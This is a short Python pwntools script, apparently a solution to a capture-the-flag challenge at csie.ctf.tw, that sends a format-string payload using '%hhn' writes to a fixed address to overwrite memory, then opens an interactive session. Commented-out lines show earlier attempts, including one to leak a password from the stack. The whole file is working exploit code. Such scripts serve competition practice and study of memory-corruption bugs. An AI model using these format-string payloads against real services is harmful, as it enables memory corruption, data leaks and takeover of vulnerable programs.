#!/usr/bin/env python
from pwn import *
r = remote('csie.ctf.tw',10120)
pause()
r.send('ddaa'+'%258c'+'%12$hhn'+p64(0x601070)+'\n')
#r.send('ddaacdef'+'aaaa'.ljust(8)+'%10$lx'.ljust(8)+'%2$ln'+'\n');#argument 1 2 3
#r.send('ddaa'+'%'.$+p64(0x601070)+'\n');
#r.send('ddaa'+'%220c'+'%12$hn@'+p64(0x601070)+p64(0x601071)+'\n')
# 0x601070 for E0  0X601071 FOR 10
# 0x601073 06
#r.send('ddaaeeff'+'@%7$lx@'+'fsad'+'\n');
#leak the password
#str1=r.recvuntil('ddaaeeff');
#print str1;
#str1=r.recvuntil('fsad');
#print str1;
#str1=str1.split('fsad');
#print str1[0];
#s=r.recvline();
r.interactive();